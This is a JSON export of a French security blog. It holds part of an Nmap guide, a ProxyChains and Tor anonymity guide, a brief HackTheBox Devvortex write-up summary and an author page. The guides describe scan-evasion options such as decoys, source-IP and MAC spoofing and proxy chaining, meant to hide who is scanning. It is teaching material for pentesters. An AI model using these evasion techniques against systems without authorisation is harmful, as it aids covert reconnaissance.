¬´nombre¬ª repr√©sente le nombre d\u0026rsquo;adresses IP √† g√©n√©rer. Il est √† noter que ces adresses ne fonctionneront pas avec la d√©tection de versions sans connexion TCP. Sur un r√©seau, il est conseill√© d\u0026rsquo;utiliser des adresses IP qui sont actives ; sinon, il sera facile de d√©terminer que vous √™tes l\u0026rsquo;unique h√¥te actif. Utilisation d\u0026rsquo;adresses IP al√©atoires :\nPar exemple, vous pouvez ex√©cuter la commande suivante pour utiliser des adresses IP al√©atoires lors d\u0026rsquo;un scan : nmap -D RND:10 Ip_cible Sp√©cification de l\u0026rsquo;Adresse Source et Options R√©seau dans Nmap #\rNmap offre une vari√©t√© d\u0026rsquo;options pour sp√©cifier des adresses IP, s√©lectionner des interfaces r√©seau et configurer des paquets, ce qui permet d\u0026rsquo;adapter les scans √† diff√©rents environnements et besoins.\nSp√©cification de l\u0026rsquo;Adresse Source #\rOption -S IP : Cette option permet de d√©finir l\u0026rsquo;adresse IP source des paquets envoy√©s par Nmap. Elle est particuli√®rement utile lorsque Nmap ne parvient pas √† d√©tecter automatiquement votre adresse IP ou lorsque vous souhaitez faire croire qu\u0026rsquo;un autre h√¥te r√©alise le scan. S√©lection de l\u0026rsquo;Interface R√©seau #\rOption -e ¬´interface¬ª : Cette option permet de s√©lectionner l\u0026rsquo;interface r√©seau sp√©cifique √† utiliser pour le scan. Pratiques de S√©curit√© #\rIl est bon de noter que certains administrateurs r√©seau pr√©f√®rent laisser de nombreux ports ouverts, tels que les ports DNS ou FTP par exemple, plut√¥t que de rechercher des solutions alternatives. Cela peut exposer le r√©seau √† des vuln√©rabilit√©s. Pour explorer ces failles potentielles, Nmap propose des options telles que --source-port ¬´num√©ro de port¬ª et -g ¬´num√©ro de port¬ª, qui sont √©quivalentes et permettent d\u0026rsquo;exploiter ces ports.\nVI- Options Avanc√©es pour les Paquets #\r--data ¬´cha√Æne hexad√©cimale¬ª : Permet d\u0026rsquo;envoyer des donn√©es sous forme de texte en utilisant le format hexad√©cimal.\n--data-string ¬´cha√Æne¬ª : Permet d\u0026rsquo;envoyer des donn√©es sous forme de texte normal.\n--data-length ¬´nombre¬ª : Sp√©cifie la longueur des donn√©es √† envoyer. Nmap enverra uniquement les en-t√™tes et ajoutera un nombre sp√©cifi√© d\u0026rsquo;octets suppl√©mentaires de mani√®re al√©atoire.\n--ip-options : Utilisez cette option pour configurer enti√®rement les options du paquet IP.\n--packet-trace : Affiche les informations sur les paquets envoy√©s et re√ßus, ce qui peut √™tre utile pour le d√©bogage.\n--ttl ¬´valeur¬ª : Permet de sp√©cifier la valeur TTL (Time to Live) des paquets envoy√©s.\n--randomize-hosts : Rend le scan moins √©vident en randomisant l\u0026rsquo;ordre des cibles, ce qui contribue √† dissimuler les activit√©s.\n--spoof-mac ¬´adresse MAC, pr√©fixe ou nom de fournisseur¬ª : Change l\u0026rsquo;adresse MAC utilis√©e lors du scan, en sp√©cifiant une adresse MAC, un pr√©fixe ou le nom d\u0026rsquo;un fournisseur.\n--proxies ¬´liste d'URL de proxy s√©par√©es par des virgules¬ª : Utilisez cette option pour effectuer des scans √† travers des proxys. Notez qu\u0026rsquo;un proxy peut ne pas maintenir autant de connexions ouvertes que Nmap le d√©sire ; par cons√©quent, il peut √™tre n√©cessaire de modifier le parall√©lisme avec l\u0026rsquo;option --max-parallelism.\n-sP : Utilisez cette option pour d√©couvrir les h√¥tes dans un r√©seau √† l\u0026rsquo;aide de l\u0026rsquo;ARP (Address Resolution Protocol).\nVII- Options de Sortie dans Nmap #\rNmap propose plusieurs options pour personnaliser la sortie des r√©sultats de scan. Ces options permettent de stocker les donn√©es dans diff√©rents formats, facilitant ainsi l\u0026rsquo;analyse ult√©rieure ou l\u0026rsquo;int√©gration dans d\u0026rsquo;autres outils.\nOptions de Sortie #\r-oN file : G√©n√®re une sortie normale dans le fichier sp√©cifi√©, offrant une vue lisible et structur√©e des r√©sultats.\n-oX file : Produit une sortie au format XML dans le fichier sp√©cifi√©, id√©ale pour les traitements automatis√©s et l\u0026rsquo;int√©gration avec d\u0026rsquo;autres outils d\u0026rsquo;analyse.\n-oS file : Cr√©e une sortie con√ßue pour les utilisateurs peu exp√©riment√©s (souvent appel√©s \u0026ldquo;script kiddies\u0026rdquo;), facilitant la compr√©hension des r√©sultats.\n-oG file : Produit une sortie au format greppable, permettant une recherche facile et rapide √† l\u0026rsquo;aide d\u0026rsquo;outils de ligne de commande.\n-oA file : G√©n√®re toutes les sorties, sauf celle destin√©e aux script kiddies, dans le fichier sp√©cifi√©. Cela inclut les formats normal, XML et greppable.\nOptions de Verbosit√© et de D√©bogage #\r-v level : D√©finit le niveau de verbosit√© de la sortie, permettant d\u0026rsquo;ajuster la quantit√© d\u0026rsquo;informations affich√©es pendant le scan.\n-d level : Sp√©cifie le niveau de d√©bogage, fournissant des d√©tails suppl√©mentaires sur le fonctionnement interne de Nmap, ce qui peut √™tre utile pour r√©soudre des probl√®mes.\nOptions d\u0026rsquo;Affichage d\u0026rsquo;√âtat et de Statistiques #\r--reason : Affiche la raison derri√®re l\u0026rsquo;√©tat de chaque h√¥te, fournissant un contexte pour les r√©sultats du scan.\n--stats-every time : Affiche les statistiques √† intervalles r√©guliers pendant l\u0026rsquo;ex√©cution du scan, permettant de suivre l\u0026rsquo;√©volution du processus.\n--packet-trace : Montre les paquets envoy√©s et re√ßus, ce qui peut √™tre utile pour le d√©bogage ou pour mieux comprendre le comportement du scan.\n--open : Affiche uniquement les ports ouverts et leur √©tat, facilitant ainsi la concentration sur les √©l√©ments importants des r√©sultats.\n--resume file : Permet de reprendre une analyse √† partir d\u0026rsquo;un fichier de reprise, ce qui est particuli√®rement utile pour les scans longs ou complexes.\nNmap propose un ensemble d\u0026rsquo;options suppl√©mentaires qui am√©liorent la flexibilit√© et la fonctionnalit√© du scan. Ces options permettent d\u0026rsquo;adapter Nmap √† des environnements vari√©s et de r√©pondre √† des besoins sp√©cifiques.\nVIII- Options Diverses #\r-6 : Active la prise en charge du protocole IPv6, permettant ainsi d\u0026rsquo;analyser des cibles utilisant ce protocole.\n-A : Ex√©cute un ensemble de fonctionnalit√©s avanc√©es, √©quivalent √† la combinaison de -O (d√©tection du syst√®me d\u0026rsquo;exploitation), -sV (d√©tection de version), -sC (ex√©cution des scripts par d√©faut) et --traceroute (d√©termination du chemin vers l\u0026rsquo;h√¥te).\nModification des Options en Cours d\u0026rsquo;Ex√©cution #\rNmap permet d\u0026rsquo;ajuster certaines options pendant l\u0026rsquo;ex√©cution, offrant une plus grande interactivit√© et r√©activit√© :\nv / V : Augmente ou diminue le niveau de verbosit√©, permettant de contr√¥ler la quantit√© d\u0026rsquo;informations affich√©es pendant le scan.\nd / D : Augmente ou diminue le niveau de d√©bogage, fournissant plus ou moins de d√©tails sur le processus interne de Nmap.\np / P : Active ou d√©sactive la tra√ßabilit√© des paquets, ce qui peut √™tre utile pour observer le comportement des paquets envoy√©s.\n? : Affiche une aide interactive, offrant un acc√®s rapide aux commandes et options disponibles.\nIX- Nmap Vulnscan #\rNmap inclut un ensemble de scripts Vulnscan qui analysent les versions des services d√©tect√©es lors des scans. Ces scripts se r√©f√®rent √† une base de donn√©es hors ligne, contenant des informations cruciales sur les vuln√©rabilit√©s potentielles associ√©es aux versions de services identifi√©es.\nBases de Donn√©es Utilis√©es #\rLes scripts Vulnscan s\u0026rsquo;appuient sur plusieurs bases de donn√©es de vuln√©rabilit√©s, que vous devez t√©l√©charger et ajouter au r√©pertoire /usr/share/nmap/scripts/vulscan/ pour les utiliser efficacement. Voici les bases de donn√©es recommand√©es :\nScipvuldb.csv - http://www.scip.ch/en/?vuldb Cve.csv - http://cve.mitre.org Osvdb.csv - http://www.osvdb.org Securityfocus.csv - http://www.securityfocus.com/bid/ Securitytracker.csv - http://www.securitytracker.com Xforce.csv - http://xforce.iss.net Exploitdb.csv - http://www.exploit-db.com Openvas.csv - http://www.openvas.org Il est √©galement n√©cessaire de t√©l√©charger les paquets des bases de donn√©es et de les ajouter √† /usr/share/nmap/scripts/vulscan/.\nPour tirer parti de Nmap Vulnscan, vous pouvez utiliser les commandes suivantes :\nPour effectuer une analyse compl√®te avec Vulnscan : sudo nmap -sV --script=vulscan \u0026lt;HOST\u0026gt; Pour utiliser une base de donn√©es sp√©cifique : sudo nmap -sV --script=vulscan --script-args vulscandb=cve.csv \u0026lt;HOST\u0026gt; Ces commandes permettent de d√©tecter les vuln√©rabilit√©s connues sur les services en cours d\u0026rsquo;ex√©cution sur l\u0026rsquo;h√¥te cibl√©, facilitant ainsi l\u0026rsquo;√©valuation de la s√©curit√©.\nX- Acc√©l√©rer l\u0026rsquo;analyse des services de Nmap x16 #\rSelon une √©tude publi√©e, il est possible d\u0026rsquo;acc√©l√©rer consid√©rablement l\u0026rsquo;analyse des services avec Nmap en ajustant certains param√®tres dans le fichier de configuration /usr/share/nmap/nmap-service-probes. Pour ce faire, modifiez toutes les occurrences de totalwaitms √† 300 millisecondes et de tcpwrappedms √† 200 millisecondes.\nPar ailleurs, les sondes qui ne poss√®dent pas de valeur servicewaitms d√©finie utilisent par d√©faut une valeur de 5000 millisecondes. Pour optimiser davantage les performances, vous pouvez soit attribuer des valeurs sp√©cifiques √† chacune des sondes, soit compiler Nmap vous-m√™me en modifiant la valeur par d√©faut dans le fichier service_scan.h.\nSi vous pr√©f√©rez ne pas modifier les valeurs totalwaitms et tcpwrappedms dans /usr/share/nmap/nmap-service-probes, une autre solution consiste √† adapter le code d\u0026rsquo;analyse de Nmap pour ignorer compl√®tement ces valeurs lors de l\u0026rsquo;ex√©cution.\nEn conclusion, Nmap est un outil essentiel pour les professionnels de la cybers√©curit√©, et offre une vaste gamme de fonctionnalit√©s pour l\u0026rsquo;analyse des r√©seaux, la d√©tection des services et l\u0026rsquo;identification des vuln√©rabilit√©s. En exploitant ses options flexibles et en ajustant les param√®tres d\u0026rsquo;analyse, les utilisateurs peuvent non seulement acc√©l√©rer le processus de d√©couverte, mais √©galement garantir une approche s√©curis√©e. Que ce soit pour des audits de s√©curit√©, des tests de p√©n√©tration ou le d√©pannage r√©seau, Nmap demeure un alli√© pr√©cieux dans la construction d\u0026rsquo;une infrastructure informatique robuste face √† des menaces en constante √©volution.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/nmap-guide/","section":"Posts","summary":"Nmap, abr√©viation de \u003cem\u003eNetwork Mapper\u003c/em\u003e, est un outil polyvalent et puissant qui peux se montrer utile autant pour un particulier q\u0026rsquo;un professionnel de la s√©curit√© informatique cherchant √† analyser, explorer et s√©curiser\u0026hellip;","title":"Nmap Guide","type":"posts"},{"content":"","date":"23 September 2023","externalUrl":null,"permalink":"/tags/proxychains/","section":"Tags","summary":"","title":"Proxychains","type":"tags"},{"content":"Dans le domaine de la cybers√©curit√© et des tests de p√©n√©tration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybers√©curit√© utilisent des outils comme ProxyChains pour masquer leur identit√© et contourner les restrictions g√©ographiques. ProxyChains permet de rediriger le trafic √† travers une s√©rie de serveurs proxy, rendant le tra√ßage de l\u0026rsquo;origine du trafic extr√™mement difficile. Cet article explore en profondeur l\u0026rsquo;utilisation de ProxyChains, de son installation sur des distributions populaires comme Kali et Ubuntu, √† son utilisation sur diverses plateformes, y compris Windows. Nous examinerons √©galement ses diff√©rentes applications, allant de la simple confidentialit√© √† des sc√©narios plus complexes impliquant SSH et Metasploit.\nTable des mati√®res #\rIntroduction √† ProxyChains Applications de ProxyChains en Cybers√©curit√© Comparaison entre ProxyChains et ProxyChains-ng Installation de ProxyChains sur Kali Installation de ProxyChains sur Ubuntu Utilisation de ProxyChains Int√©gration de ProxyChains avec Tor Consid√©rations pour l\u0026rsquo;utilisation de ProxyChains Conclusion Introduction √† ProxyChains #\rAvant de plonger dans les d√©tails de ProxyChains, il est important de comprendre le concept de proxy.\nQu\u0026rsquo;est-ce qu\u0026rsquo;un Proxy ? #\rUn proxy est un serveur interm√©diaire qui agit comme une passerelle entre un utilisateur et Internet. Par exemple, lorsque vous visitez un site web comme google.com, au lieu d\u0026rsquo;envoyer directement les paquets au serveur de Google, vous les envoyez d\u0026rsquo;abord au proxy, qui les transmet ensuite √† Google. Ce m√©canisme permet au serveur de destination de voir les informations du proxy plut√¥t que celles de l\u0026rsquo;utilisateur, offrant ainsi une confidentialit√© accrue.\nQu\u0026rsquo;est-ce que ProxyChains ? #\rProxyChains am√©liore ce concept en utilisant plusieurs serveurs proxy en cha√Æne. Le trafic part de votre machine, passe par plusieurs serveurs proxy avant d\u0026rsquo;atteindre la destination finale, rendant le tra√ßage de votre adresse IP d\u0026rsquo;origine beaucoup plus difficile. ProxyChains supporte l\u0026rsquo;int√©gration avec Tor, SOCKS et les proxys HTTP, permettant une flexibilit√© et une s√©curit√© accrues lors de la navigation sur Internet. Il peut √©galement √™tre configur√© pour fonctionner avec des applications telles que Nmap et SQLmap.\nApplications de ProxyChains en Cybers√©curit√© #\rProxyChains est souvent utilis√© dans le cadre de tests de p√©n√©tration ou de red teaming pour masquer l\u0026rsquo;origine du trafic et simuler des acc√®s depuis diff√©rentes localisations ou adresses IP. En encha√Ænant plusieurs proxies, y compris des syst√®mes compromis, les red teamers peuvent mieux dissimuler leurs mouvements au sein d\u0026rsquo;un r√©seau, rendant leur d√©tection plus difficile. De plus, il est possible de contourner des pare-feux restrictifs pour acc√©der √† des ressources bloqu√©es.\nComparaison entre ProxyChains et ProxyChains-ng #\rProxyChains-ng, ou \u0026ldquo;next generation\u0026rdquo;, est une version am√©lior√©e du projet ProxyChains. Il propose des fonctionnalit√©s avanc√©es et une meilleure compatibilit√©. ProxyChains-ng est un programme UNIX qui intercepte les fonctions libc li√©es au r√©seau dans des programmes li√©s dynamiquement via une DLL pr√©charg√©e. Il redirige les connexions via des proxies SOCKS4a/5 ou HTTP et supporte uniquement le protocole TCP.\nInstallation de ProxyChains sur Kali #\rProxyChains-ng est pr√©install√© sur Kali. Pour v√©rifier son installation, entrez la commande:\nproxychains4 Installation de ProxyChains sur Ubuntu #\rProxyChains-ng n\u0026rsquo;est pas install√© par d√©faut sur Ubuntu, mais peut √™tre install√© en suivant ces √©tapes :\nMettez √† jour vos d√©p√¥ts üòÄ sudo apt update -y Installez ProxyChains-ng : sudo apt install proxychains4 V√©rifiez l\u0026rsquo;installation en entrant : proxychains4 Utilisation de ProxyChains #\rPour utiliser ProxyChains, vous devez d\u0026rsquo;abord configurer le fichier de configuration de ProxyChains pour y ajouter vos proxies. Ouvrez le fichier de configuration avec un √©diteur de texte :\nsudo nano /etc/proxychains4.conf Ajoutez vos proxies √† la fin du fichier en utilisant le format \u0026lt;protocole\u0026gt; \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;. Vous pouvez √©galement configurer la mani√®re dont ProxyChains utilise la liste des proxies (cha√Ænes dynamiques, strictes, round-robin, ou al√©atoires).\nInt√©gration de ProxyChains avec Tor #\rTor (The Onion Router) permet une communication anonyme sur Internet en faisant transiter le trafic √† travers plusieurs serveurs op√©r√©s par des b√©n√©voles √† travers le monde.\nUtilisation de Tor et ProxyChains #\rInstallation de Tor sudo apt install tor D√©marrage du service Tor sudo service tor start Assurez-vous que le fichier de configuration de ProxyChains utilise le proxy SOCKS sur le port 9050 (port par d√©faut de Tor). Ensuite, lancez votre navigateur via ProxyChains :\nproxychains4 firefox Consid√©rations pour l\u0026rsquo;utilisation de ProxyChains #\rPour maximiser l\u0026rsquo;anonymat avec ProxyChains, il est crucial de choisir des proxies fiables et anonymes situ√©s dans diff√©rentes r√©gions g√©ographiques. Des listes de proxies gratuits sont disponibles sur des sites comme GitHub, mais il est recommand√© de les tester r√©guli√®rement pour √©viter les proxies d√©faillants. Des services payants comme Webshare offrent des proxies fiables et anonymes.\nConclusion #\rProxyChains est un outil puissant pour am√©liorer l\u0026rsquo;anonymat en ligne et contourner les restrictions g√©ographiques. Que vous soyez un professionnel de la cybers√©curit√© ou un utilisateur soucieux de sa confidentialit√©, ProxyChains offre une flexibilit√© et une s√©curit√© accrues pour vos activit√©s en ligne. Explorez ses diff√©rentes fonctionnalit√©s pour voir comment il peut r√©pondre √† vos besoins.\nFoire Aux Questions #\rProxyChains est-il meilleur qu\u0026rsquo;un VPN ? #\rChaque solution a ses avantages. Les VPN encryptent votre trafic via un tunnel, tandis que ProxyChains redirige simplement le trafic √† travers plusieurs proxies. Les VPN offrent un niveau de s√©curit√© et de confidentialit√© plus √©lev√©, mais pas n√©cessairement l\u0026rsquo;anonymat, puisque le fournisseur de VPN conna√Æt votre identit√©.\nProxyChains est-il pr√©install√© sur Kali ? #\rOui, Kali inclut ProxyChains par d√©faut. Vous pouvez le v√©rifier avec la commande proxychains4.\nPourquoi les hackers utilisent-ils des serveurs proxy ? #\rLes hackers utilisent des serveurs proxy pour masquer leur adresse IP et leur localisation, rendant leur tra√ßabilit√© difficile.\nQuelle est la diff√©rence entre Tor et ProxyChains ? #\rTor crypte le trafic entre chaque relais de son r√©seau, tandis que ProxyChains ne fournit pas de cryptage, comptant sur les serveurs proxy pour s√©curiser le trafic.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/proxychains/","section":"Posts","summary":"Dans le domaine de la cybers√©curit√© et des tests de p√©n√©tration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybers√©curit√© utilisent des outils comme ProxyChains pour masquer leur identit√© et contourner les restrictions g√©ographiques.","title":"Proxychains Guide","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"DevVortex est une machine Linux de niveau easy n√©cessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de r√©pertoire qui m√®nera sur la d√©couverte d\u0026rsquo;un dashboard admin Joomla obsol√®te dont l\u0026rsquo;exploitation permettra de trouver des identifiants de connexion. Le dashboard administrateur servira ensuite √† √©diter des fichiers PHP pour obtenir un reverse shell. Les m√™mes identifiants de connexion, seront ensuite utilis√©s pour avoir acc√®s √† un hash MySQL, qu\u0026rsquo;on d√©chiffrera avec John. La connexion via SSH r√©v√®lera ensuite l\u0026rsquo;utilisation d\u0026rsquo;une ancienne version apport-cli, permettant l\u0026rsquo;ex√©cution d\u0026rsquo;un shell root.\n","date":"4 September 2023","externalUrl":null,"permalink":"/posts/htb-devvortex/","section":"Posts","summary":"DevVortex est une machine Linux de niveau easy n√©cessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de r√©pertoire qui m√®nera sur la d√©couverte d\u0026rsquo;un dashboard admin \u003cstrong\u003eJoomla\u003c/strong\u003e obsol√®te\u0026hellip;","title":"HTB - Devvortex","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/writups/","section":"Tags","summary":"","title":"Writups","type":"tags"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"\rProfile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally. Presently, I work as a Network Security Administrator, where I also delve into penetration testing and actively participate in Hackthebox CTF challenges.\nInterests and Activities My passion for cybersecurity extends beyond my professional role. This blog is a space where I share my experiences, CTF write-ups, and IT-related content. I invite you to explore my posts and join me in the thrilling world of cybersecurity.\nAchievements Throughout my career, I have earned various IT badges, which reflect my commitment to continuously expanding my knowledge and skills. My GitHub profile is a testament to my contributions to the cybersecurity community, showcasing projects and tools I have developed.\nProjects and Tools ‚Ä¢ Secur\u0026hellip;.\n‚Ä¢ Crypt\u0026hellip;.\nContact For business inquiries or to connect with me:\n‚Ä¢ LinkedIn: Crispus Houessou\n‚Ä¢ Twitter: @0xR4zn\nFeel free to reach out if you have any questions or if you\u0026rsquo;d like to discuss anything related to cybersecurity. Join me on this exciting journey as we navigate the ever-evolving world of cybersecurity together!\n","externalUrl":null,"permalink":"/about/","section":"Raizen | Blog","summary":"Profile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally.","title":"About","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]